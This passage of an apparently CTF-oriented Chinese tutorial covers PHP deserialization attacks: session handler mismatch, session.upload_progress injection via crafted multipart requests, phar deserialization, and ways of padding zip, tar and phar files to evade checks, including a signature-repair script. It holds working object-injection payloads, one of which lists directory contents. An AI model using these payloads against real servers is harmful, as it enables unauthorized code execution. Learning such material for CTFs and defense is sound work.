。</p><p>测试一下，demo如下：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;session.serialize_handler&#x27;</span>,<span class="string">&#x27;php&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;session&#x27;</span>] = <span class="variable">$_GET</span>[<span class="string">&#x27;session&#x27;</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h5 id="php处理器-1"><a href="#php处理器-1" class="headerlink" title="php处理器"></a>php处理器</h5><p><img src="https://bu.dusays.com/2024/05/13/6641630dc052d.png" alt="image-20240502144559398"></p><p>解析一下：<br>序列化的结果为:<code>session|s:6:&quot;Fupanc&quot;;</code></p><p>其中<code>session</code>为$_SESSION[‘session’]的键名，<code>|</code>为传入GET参数经过序列化后的值。</p><h5 id="php-binary处理器"><a href="#php-binary处理器" class="headerlink" title="php_binary处理器"></a>php_binary处理器</h5><p><img src="https://bu.dusays.com/2024/05/13/66416315d796a.png" alt="image-20240502145305649"></p><p>将指定处理器函数的参数php改为这个就行，为了方便看，将键名改长一些，（否则对应的ascii字符不可见)，测试结果如下</p><p>demo改为：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;session.serialize_handler&#x27;</span>,<span class="string">&#x27;php_binary&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;sessionseesionsessionsessionsession&#x27;</span>] = <span class="variable">$_GET</span>[<span class="string">&#x27;session&#x27;</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>结果如下：</p><p><img src="https://bu.dusays.com/2024/05/13/6641630e504d7.png" alt="image-20240502145320585"></p><p>两张图片可以对比一下</p><p>序列化的结果为：<code>#sessionsessionsessionsessionsessions:6:&quot;Fupanc&quot;;</code></p><p>解析一下：<br><code>#</code>即为长度为35在ascii对应的符号</p><p><img src="https://bu.dusays.com/2024/05/13/6641630ca56b9.png" alt="image-20240502145401992"></p><p><code>sessionsessionsessionsessionsessions</code>是键名,</p><p><strong>注意：</strong></p><p>这里序列化后的结果会在原代码设置的键名后加一个s，测试了一下，无论大写为多少</p><p><code>6:&quot;Fupanc&quot;;</code>即为序列化后的字符串。</p><h5 id="php-serialize-处理器"><a href="#php-serialize-处理器" class="headerlink" title="php_serialize 处理器"></a>php_serialize 处理器</h5><p>demo如下：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;session.serialize_handler&#x27;</span>,<span class="string">&#x27;php_serialize&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;session&#x27;</span>] = <span class="variable">$_GET</span>[<span class="string">&#x27;session&#x27;</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>测试结果：</p><p><img src="https://bu.dusays.com/2024/05/13/6641630ca5660.png" alt="image-20240502145746648"></p><p>序列化结果为：<code>a:1:&#123;s:7:&quot;session&quot;;s:6:&quot;Fupanc&quot;;&#125;</code></p><p>解析：<br><code>a:1</code>表示<code>$_SESSION</code>数组中有一个元素，或括号里面的内容即为传入GET参数经过序列化后的值。</p><h3 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h3><h4 id="自建环境模拟"><a href="#自建环境模拟" class="headerlink" title="自建环境模拟"></a>自建环境模拟</h4><p>建造一个环境，有两个文件，分别如下：</p><p>flag.php：</p><p>这个页面用于接受session的值</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;session.serialize_handler&#x27;</span>,<span class="string">&#x27;php_serialize&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;session&#x27;</span>] = <span class="variable">$_GET</span>[<span class="string">&#x27;session&#x27;</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>1.php：</p><p>这个页面用于测试反序</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;session.serialize_handller&#x27;</span>,<span class="string">&#x27;php&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">   <span class="variable language_">$this</span>-&gt;name=<span class="string">&#x27;haha&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="title function_ invoke__">print_r</span>(<span class="variable">$this</span>-&gt;name);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">test</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>先访问1.php，输出</p><p><img src="https://bu.dusays.com/2024/05/13/6641630f99e53.png" alt="image-20240502145916097"></p><p>这里开启了<code>session_start()</code>函数，可以在flag.php页面利用session变量进行反序列化。如下构造payload：</p><p><img src="https://bu.dusays.com/2024/05/13/6641630e91508.png" alt="image-20240502145939815"></p><p>再在flag.php页面传入这个参，但是需要在前面加上一个<code>|</code>，这是因为php处理器会把|前面的内容当做键，后面的内容才会被反序列化后赋值给session变量</p><p><img src="https://bu.dusays.com/2024/05/13/6641630e51444.png" alt="image-20240502150059478"></p><p>此时的session:</p><p><code>a:1:&#123;s:7:&quot;session&quot;;s:40:&quot;|O:4:&quot;test&quot;:1:&#123;s:4:&quot;name&quot;;s:6:&quot;diyici&quot;;&#125;&quot;;&#125;</code></p><p>这里可以看到成功写入，这是再访问以下1.php</p><p>成功反序列化</p><p><img src="https://bu.dusays.com/2024/05/13/6641630d61924.png" alt="image-20240502150217878"></p><p><strong>但是这里的局限性太大，有如下条件：</strong></p><ul><li>两个文件session引擎配置不同</li><li>其中一个session可控</li><li>两个文件同域</li></ul><p>这个只是一个简单的复现过程，真实题目应该不能自己传session进去，现在看看稍真实页面是如何打的。</p><h4 id="利用session-upload-progress进行反序列化-方式一"><a href="#利用session-upload-progress进行反序列化-方式一" class="headerlink" title="利用session.upload_progress进行反序列化-方式一"></a>利用session.upload_progress进行反序列化-方式一</h4><p>结合下述Session上传进度，<strong>这个方法需要php≥5.4</strong></p><p><a href="https://bugs.php.net/bug.php?id=71101">漏洞官方说明</a></p><p>这个漏洞条件官方说的挺清楚的，简单说明一下使用这个方法的条件</p><p>条件：</p><ol><li><code>session.upload_progress.enabled = On</code>（是否启用上传进度报告）</li><li><code>session.upload_progress.cleanup = Off</code>（是否上传完成之后删除session文件-这里需要为Off）</li></ol><p>这两个都是可在查的</p><p><img src="https://bu.dusays.com/2024/05/13/6641630e9ead5.png" alt="image-20240502150413937"></p><p><strong>当enabled被设置为on时，此时再往服务器中上传一个文件时，PHP会把该文件的详细信息（如上传时间、上传进度等）存储到session，所以上传文件进度的报告就会以写入到session文件中</strong>，所以我们可以设置一个与<code>session.upload_progress.name</code>同名的变量(默认名为<code>PHP_SESSION_UPLOAD_PROGRESS</code>)，PHP检测到这种同名请求会在<code>$_SESSION</code>中添加一条数据。我们就可以控制这个数据内容为我们的恶意payload</p><p><strong>对session上传进度说明一下：</strong></p><p><img src="https://bu.dusays.com/2024/05/13/66416314eb260.png" alt="image-20240502150438892"></p><p>但是需要自己构造一个<strong>文件上传表单</strong>，代码如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;form action=&quot;http://web.jarvisoj.com:32784/&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt;</span><br><span class="line">&lt;input type=&quot;hidden&quot; name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot; value=&quot;123&quot; /&gt;</span><br><span class="line">&lt;input type=&quot;file&quot; name=&quot;file&quot; /&gt;</span><br><span class="line">&lt;input type=&quot;submit&quot; value=&quot;submit&quot; /&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>，在上传文件(必须上传)时抓包，直接借用官方的说明，有两种改法（第二种待验证）来进行反序：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-POST_RAW--</span><br><span class="line">Content-Type: multipart/form-data; boundary=---------------------------20896060251896012921717172737</span><br><span class="line">-----------------------------20896060251896012921717172737</span><br><span class="line">Content-Disposition: form-data; name=&quot;PHPSESSID&quot;</span><br><span class="line"></span><br><span class="line">session-data-injection</span><br><span class="line">-----------------------------20896060251896012921717172737</span><br><span class="line">Content-Disposition: form-data; name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span><br><span class="line"></span><br><span class="line">|xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxO:3:&quot;obj&quot;:0:&#123;&#125;</span><br><span class="line">-----------------------------20896060251896012921717172737</span><br><span class="line">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;file.txt&quot;</span><br><span class="line"></span><br><span class="line">1</span><br><span class="line">-----------------------------20896060251896012921717172737--</span><br></pre></td></tr></table></figure><p>第一个就是上述官方改法，还有一个是在<a href="https://www.freebuf.com/articles/web/324943.html">文章</a>里看到可以改将filename那个file.txt改成payload(文章基本都是这样改的，在值里面改肯能会应该出现|导致数据写入session失败)</p><p><strong>但是文件名需要注意防止引号被转义同时也是为了防止与最外层的双引号冲突</strong>，需要使用\来说明，借用文章代码说明一下（待验证-还是很多文章都在用这种改法）：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-----------------------------23899461075638356511525184357</span><br><span class="line">Content-Disposition: form-data; name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span><br><span class="line"></span><br><span class="line">123</span><br><span class="line">-----------------------------23899461075638356511525184357</span><br><span class="line">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;|O:5:\&quot;OowoO\&quot;:1:&#123;s:4:\&quot;mdzz\&quot;;s:36:\&quot;print_r(scandir(dirname(__FILE__)));\&quot;;&#125;&quot;</span><br><span class="line">Content-Type: text/plain</span><br><span class="line"></span><br><span class="line">123</span><br><span class="line">-----------------------------23899461075638356511525184357--</span><br></pre></td></tr></table></figure><p><strong>上传成功就可以直接在Index.php页面利用这个payload</strong></p><h4 id="利用session-upload-progress进行反序列化-方式二"><a href="#利用session-upload-progress进行反序列化-方式二" class="headerlink" title="利用session.upload_progress进行反序列化-方式二"></a>利用session.upload_progress进行反序列化-方式二</h4><p><strong>同样需要php≥5.4</strong></p><p>这个方法着重于解决当配置如下使如何解决,一般这个是php.ini的默认项：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. session.upload_progress.enabled = on</span><br><span class="line">2. session.upload_progress.cleanup = on</span><br><span class="line">3. session.upload_progress.prefix = &quot;upload_progress_&quot;</span><br><span class="line">4. session.upload_progress.name = &quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span><br><span class="line">5. session.upload_progress.freq = &quot;1%&quot;</span><br><span class="line">6. session.upload_progress.min_freq = &quot;1&quot;</span><br></pre></td></tr></table></figure><p>这里与上面的最主要的区别就是<code>session.upload_progress.cleanup = on</code>，表示当文件上传结束后，php将会立即清空对应session文件中的内容，也就代表我们每次<strong>正常访问</strong>session文件时都是<strong>空文件</strong>。所以想要利用就需要竞争。</p><p><strong>如果cleanup被设置为On，就需要使用条件竞争</strong></p><p>&#x3D;&#x3D;还有一个比较重要的配置：&#x3D;&#x3D;<br><code>session.use_strict_mode=off</code>，这个选项默认值为off，表示我们对cookie中的sessionid可控。这一点很重要。</p><p>开始解析：</p><ol><li></li></ol><ul><li>配置文件中的<code>session.use_strict_mode</code>默认为0时，这个情况下，用户可以定义自己的sessionid，例如当用户在cookie中设置<code>sessionid=Lxxx</code>时，PHP就会生成一个文件<code>/tmp/sess_Lxxx</code>，此时也就初始化了session，并且会将上传的文件信息写入到文件<code>/tmp/sess_Lxxx</code>中去。</li><li>由于<strong>在这种情况下cleanup的值为on</strong>，所以文件上传成功后文件内容会马上被清空，此时就需要利用Python的多线程来条件竞争</li></ul><p>参考文章:<code>https://www.freebuf.com/vuls/202819.html</code></p><p>其他例题参考：<br>简单过程说明以及其他ctf题解<a href="https://xz.aliyun.com/t/6640?time__1311=n4+xnD0DRDBGitN4q05+bDyiDumxc7l1lZZYD&alichlgref=https://cn.bing.com/#toc-9">文章</a></p><h2 id="phar反序列化"><a href="#phar反序列化" class="headerlink" title="phar反序列化"></a>phar反序列化</h2><h3 id="phar反序列化基础"><a href="#phar反序列化基础" class="headerlink" title="phar反序列化基础"></a>phar反序列化基础</h3><p>phar是一种文件</p><p><img src="https://bu.dusays.com/2024/05/13/6641632023214.png" alt="image-20240303175826285"></p><p>phar与反序列化关系</p><p><img src="https://bu.dusays.com/2024/05/13/664163173458e.png" alt="image-20240303180037559"></p><p>结构：<br><img src="https://bu.dusays.com/2024/05/13/66416323ea225.png" alt="image-20240303180142912"></p><p><img src="https://bu.dusays.com/2024/05/13/66416322084e7.png" alt="image-20240303180338837"></p><p><img src="https://bu.dusays.com/2024/05/13/6641632425ffb.png" alt="image-20240303180413877"></p><p><img src="https://bu.dusays.com/2024/05/13/6641632269c76.png" alt="image-20240303180429119"></p><p>原理：</p><p><img src="https://bu.dusays.com/2024/05/13/66416321cbe89.png" alt="image-20240303180705908"></p><p>例1：</p><p><img src="https://bu.dusays.com/2024/05/13/66416312cbfb2.png" alt="image-20240303180820143"></p><p><img src="https://bu.dusays.com/2024/05/13/6641630f2077f.png" alt="image-20240303181134271"></p><p>（改类名 命令）</p><p><img src="https://bu.dusays.com/2024/05/13/6641a0e937350.png" alt="image-20240303181349949"></p><p>条件：</p><p><img src="https://bu.dusays.com/2024/05/13/6641631ddae81.png" alt="image-20240303181625522"></p><p>例2：</p><p><img src="https://bu.dusays.com/2024/05/13/66416318000d2.png" alt="image-20240303181818732"></p><p><img src="https://bu.dusays.com/2024/05/13/6641631d55b04.png" alt="image-20240303181937798"></p><p><img src="https://bu.dusays.com/2024/05/13/664163182c5d1.png" alt="image-20240303182021472"></p><p><img src="https://bu.dusays.com/2024/05/13/6641a0ef6e8d9.png" alt="image-20240303182128988"></p><p>生成.phar文件</p><img src="https://bu.dusays.com/2024/05/13/6641631787c31.png" alt="image-20240303182310868" style="zoom:150%;" /><p>版本问题 </p><p>把php.ini中的参数（phar.readonly）改了</p><p>不挑后缀</p><p>text.phar-&gt;text.jpg</p><p><img src="https://bu.dusays.com/2024/05/13/6641631546fd4.png" alt="image-20240303182806367"></p><p><img src="https://bu.dusays.com/2024/05/13/66416321ae70d.png" alt="image-20240303182838379"></p><h3 id="脏数据污染"><a href="#脏数据污染" class="headerlink" title="脏数据污染"></a>脏数据污染</h3><p>phar支持的格式</p><p>phar文件可以是下面三种格式：</p><blockquote><ul><li>zip .zip .phar.zip </li><li>tar .tar .phar.tar .pahr..tar.gz .phar.tar.bz </li><li>phar .phar .phar.bz2   <code>bzip2 phar.phar</code></li></ul></blockquote><p>在实战中的利用</p><ol><li>可以使用压缩包的方法直接将数据压缩为<code>zip</code>,<code>tar</code>,<code>tar.gz</code>,<code>tar.bz</code>从而绕过<code>stub</code>或反序列化字段的检测(zip不会压缩反序列化数据段) </li><li>可以使用<code>.phar格式修复</code>的方法解决phar文件头部(使用phar)或者文件尾(使用tar)被添加脏数据的问题</li></ol><h4 id="zip添加脏数据"><a href="#zip添加脏数据" class="headerlink" title="zip添加脏数据"></a>zip添加脏数据</h4><p> — 头尾均可添加脏数据但是phar无法解析</p><p><a href="https://cloud.tencent.com/developer/tools/blog-entry?target=https://github.com/phith0n/PaddingZip&source=article&objectId=2287505">https://github.com/phith0n/PaddingZip</a> </p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">python paddingzip.<span class="property">py</span> -i ../test.<span class="property">phar</span>.<span class="property">zip</span> -o ../test1.<span class="property">phar</span>.<span class="property">zip</span> --prepend <span class="string">&quot;this prepend to the start&quot;</span> --append <span class="string">&quot;this append to the end&quot;</span></span><br></pre></td></tr></table></figure><p>此外在readme手册中还提到可以在linux中通过以下方式添加脏数据:</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">$ echo -n <span class="string">&quot;prepend&quot;</span> &gt; f</span><br><span class="line">$ cat f a.<span class="property">zip</span> &gt; b.<span class="property">zip</span></span><br><span class="line">$ zip -F b.<span class="property">zip</span> --out c.<span class="property">zip</span></span><br></pre></td></tr></table></figure><p>在phar中的使用限制</p><p>ZIP格式的文件头尾都可以有脏字符，通过对偏移量的修复就可以重新获得一个合法的zip文件。但是否遵守这个规则，仍然取决于zip解析器，经过测试，phar解析器如果发现文件头不是zip格式，即使后面偏移量修复完成，也将触发错误</p><p>虽然zip添加不了脏数据让人大失所望,但是却在这里看到了zip却只要将phar的内容写进压缩包注释中，也同样能够反序列化，而且压缩后的zip数据也可以绕过stub检测,但是过不了反序列化数据检测(和Phar执行zip生成格式差不多,但是挺有意思的记一下吧)</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">test</span>&#123;</span><br><span class="line">    public  <span class="keyword">function</span> <span class="title function_">__wakeup</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="title function_">var_dump</span>(__FUNCTION__);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">phar_file = <span class="title function_">serialize</span>(<span class="keyword">new</span> <span class="title function_">test</span>());zip = <span class="keyword">new</span> <span class="title class_">ZipArchive</span>();</span><br><span class="line">res =zip-&gt;<span class="title function_">open</span>(<span class="string">&#x27;justzip.zip&#x27;</span>,<span class="title class_">ZipArchive</span>::<span class="variable constant_">CREATE</span>);</span><br><span class="line">zip-&gt;<span class="title function_">addFromString</span>(<span class="string">&#x27;h0cksr.txt&#x27;</span>, <span class="string">&#x27;file content goes here&#x27;</span>);zip-&gt;<span class="title function_">setArchiveComment</span>(phar_file);zip-&gt;<span class="title function_">close</span>();</span><br><span class="line"></span><br><span class="line"><span class="title function_">readfile</span>(<span class="string">&quot;phar://justzip.zip&quot;</span>);</span><br></pre></td></tr></table></figure><p>哪些场景不能解析带脏字符的zip文件呢? </p><ol><li>Java -jar执行这个带脏字符的jar包时会失败</li><li>PHP无法解析 </li><li>7zip无法解析</li></ol><h4 id="tar添加脏数据"><a href="#tar添加脏数据" class="headerlink" title="tar添加脏数据"></a>tar添加脏数据</h4><p> — 可以在文件尾添加脏数据且phar正常解析</p><p><strong>对于tar格式</strong>，如果能控制文件头，即可构造合法的tar文件，即使文件尾有垃圾字符</p><p>这个测试的话毫无技术要求,直接使用010打开<code>tar</code>文件, 然后触发调用可以看到phar反序列化还是被正常执行了</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="comment">//class test&#123;</span></span><br><span class="line"><span class="comment">//    public  function __wakeup()&#123;</span></span><br><span class="line"><span class="comment">//        var_dump(__FUNCTION__);</span></span><br><span class="line"><span class="comment">//    &#125;</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"><span class="comment">//phar=new phar(&#x27;test.phar&#x27;);//后缀名必须为phar</span></span><br><span class="line"><span class="comment">//phar = phar-&gt;convertToExecutable(Phar::TAR);</span></span><br><span class="line"><span class="comment">//phar-&gt;startBuffering();</span></span><br><span class="line"><span class="comment">/*phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER();?&gt;&quot;);//设置stub*/</span></span><br><span class="line"><span class="comment">//obj=new test();</span></span><br><span class="line"><span class="comment">//phar-&gt;setMetadata(obj);//自定义的meta-data存入manifest</span></span><br><span class="line"><span class="comment">//phar-&gt;addFromString(&quot;flag.txt&quot;,&quot;flag&#123;h0cksr&#125;&quot;);//添加要压缩的文件</span></span><br><span class="line"><span class="comment">////签名自动计算</span></span><br><span class="line"><span class="comment">//phar-&gt;stopBuffering();</span></span><br><span class="line"><span class="comment">//?&gt;</span></span><br><span class="line">&lt;?php</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">test</span>&#123;</span><br><span class="line">    public  <span class="keyword">function</span> <span class="title function_">__wakeup</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="title function_">var_dump</span>(__FUNCTION__);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">var_dump</span>(</span><br><span class="line">    <span class="title function_">file_get_contents</span>(<span class="string">&quot;compress.zlib://phar://test1.phar.tar/flag.txt&quot;</span>)<span class="comment">//未修改,读取数据失败,反序列化触发成功</span></span><br><span class="line">);</span><br><span class="line"><span class="title function_">var_dump</span>(</span><br><span class="line">    <span class="title function_">file_get_contents</span>(<span class="string">&quot;compress.zlib://phar://test2.phar.tar/flag.txt&quot;</span>)<span class="comment">//文件头添加内容,读取数据失败,反序列化触发失败</span></span><br><span class="line">);</span><br><span class="line"><span class="title function_">var_dump</span>(</span><br><span class="line">    <span class="title function_">file_get_contents</span>(<span class="string">&quot;compress.zlib://phar://test3.phar.tar/flag.txt&quot;</span>)<span class="comment">//文件尾添加内容,读取数据失败,反序列化触发成功</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>这段PHP代码主要展示了如何使用Phar归档文件，以及如何通过Phar文件来触发对象的反序列化。Phar是一种PHP的归档格式，允许开发者将多个PHP文件打包成一个文件，并可以直接通过PHP解释器执行。</p><p>然而，代码中有一些注释掉的部分，这些部分原本是用来创建Phar文件的。代码的目的似乎是为了测试不同情况下通过Phar文件读取数据时，是否能够成功触发对象的反序列化。</p><p>此外还在<a href="https://cloud.tencent.com/developer/tools/blog-entry?target=https://exp10it.cn/2022/08/phar-%E7%AD%BE%E5%90%8D%E7%9A%84%E4%BF%AE%E5%A4%8D%E4%B8%8E%E7%BB%95%E8%BF%87/%23%E4%BD%BF%E7%94%A8-tar-%E7%BB%95%E8%BF%87%E7%AD%BE%E5%90%8D&source=article&objectId=2287505">使用 tar 绕过签名</a>看到可以直接使用打包一个只放了反序列化数据的<code>.metadata</code>文件生成的.tar压缩包可以直接用来触发反序列化</p><blockquote><p> linux环境下执行  mkdir test;cd test mkdir .phar;cd .phar echo ‘O:4:”test”:0:{}’ &gt; .metadata cd ..&#x2F;.. tar -cf phar.tar .phar&#x2F; 生成的<code>phar.tar</code>可以直接通过<code>phar://phar.tar</code>触发反序列化 </p></blockquote><h4 id="pahr文件"><a href="#pahr文件" class="headerlink" title="pahr文件"></a>pahr文件</h4><p> — 可以在文件头添加脏数据且phar正常解析</p><p><strong>phar格式</strong>，必须控制文件尾，<code>但不需要控制文件头</code>。PHP在解析时会在文件内查找<code>&lt;?php __HALT_COMPILER(); ?&gt;</code>这个标签，这个标签前面的内容可以为任意值，但后面的内容必须是phar格式，并以该文件的sha1签名与字符串<code>GBMB</code>结尾。</p><p>phar格式可以直接在文件头加脏数据并且还能正常反序列化, 但是这点需要重新计算一下签名, 下面就是修正签名的脚本</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="title function_">open</span>(<span class="string">&#x27;phar.phar&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> <span class="attr">f</span>:</span><br><span class="line">    content = f.<span class="title function_">read</span>()</span><br><span class="line"></span><br><span class="line">text = content[:-<span class="number">28</span>]</span><br><span class="line">end = content[-<span class="number">8</span>:]</span><br><span class="line">sig = hashlib.<span class="title function_">sha1</span>(text).<span class="title function_">digest</span>()</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="title function_">open</span>(<span class="string">&#x27;phar_new.phar&#x27;</span>, <span class="string">&#x27;wb+&#x27;</span>) <span class="keyword">as</span> <span class="attr">f</span>:</span><br><span class="line">    f.<span class="title function_">write</span>(text + sig + end)</span><br></pre></td></tr></table></figure><p>(pahr默认使用sha1加密就是有<code>20字节</code>的签名生成结果, 在签名后面还有<code>8字节</code>,<code>前4字节表示文件使用的签名算法</code>,<code>最后四字节固定用于表示该文件存在签名</code>)</p><p>phar文件内容&#x3D;数据段+签名(默认sha1有20字节大小)+签名方式(4字节)+声明文件有无签名(4字节)</p><p>除了sha1之外phar还可以使用<code> MD5, SHA256, SHA512, OpenSSL</code>生成签名</p><p>签名是前面全部<code>数据段</code>的内容根据加密算法加密得到的结果</p><p>所以当我们想要利用phar触发反序列化但是上传的文件在头部被添加了脏数据的话我们可以通过以下方法构造可利用的phar文件:</p><blockquote><ol><li>先生成正常的的<code>.pahr</code>文件</li><li>往文件头部添加脏数据</li><li>使用上面代码改正签名</li><li>使用010editor将头部的脏数据删除</li><li>上传文件</li></ol></blockquote><h2 id="GC强制回收"><a href="#GC强制回收" class="headerlink" title="GC强制回收"></a>GC强制回收</h2><p>__dustruct执行条件</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1：对象为null</span><br><span class="line">2：生命周期结束的时候</span><br><span class="line">3：当一个对象被unset （GC)</span><br></pre></td></tr></table></figure><p>由此</p><blockquote><p>如果程序走了一半，突然报错，那么<code>__destruct()不会触发了，那如果又必须要__destruct()触发</code>,又该如何操作呢？</p></blockquote><p>PHP Garbage Collection简称GC，又名垃圾回收，在PHP中使用引用计数和回收周期来自动管理内存对象的。</p><p>垃圾，顾名思义就是一些没有用的东西。在这里指的是一些数据或者说是变量在进行某些操作后被置为空(NULL)或者是没有地址(指针)的指向，这种数据一旦被当作垃圾回收后就相当于把一个程序的结尾给划上了句号，那么就不会出现无法调用__destruct()方法了。</p><p>具体原理可查看php官方解答<a href="https://www.php.net/manual/zh/features.gc.collecting-cycles.php">PHP: 回收周期(Collecting Cycles) - Manual</a></p><p>接下来用演示代码演示GC的实际工作原理</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">errorr</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$num</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$num</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;num = <span class="variable">$num</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;num.<span class="string">&quot;__construct&quot;</span>.<span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;num.<span class="string">&quot;__destruct()&quot;</span>.<span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">new</span> <span class="title function_ invoke__">errorr</span>(<span class="number">1</span>);</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">errorr</span>(<span class="number">2</span>);</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="title function_ invoke__">errorr</span>(<span class="number">3</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>此时结果：</p><p><img src="https://bu.dusays.com/2024/05/13/66416313d17a7.png" alt="image-20240312201424971"></p><p>如图，</p><p><code>new了一个errorr对象，屁股还没坐热就__destruct()了。后面的两个对象则是按部就班先创建完没有操作了以后才结束的。</code></p><p><strong>区别就在于对象1没有任何引用也没有指向，在创建的那一刻就被当作垃圾回收了，从而触发了__destruct()方法。</strong></p><p>进而，如果没有指向可以，那如过在指向一个对象的中途忽然指向另一个，也就是舍弃了该对象又会怎么样。</p><p><img 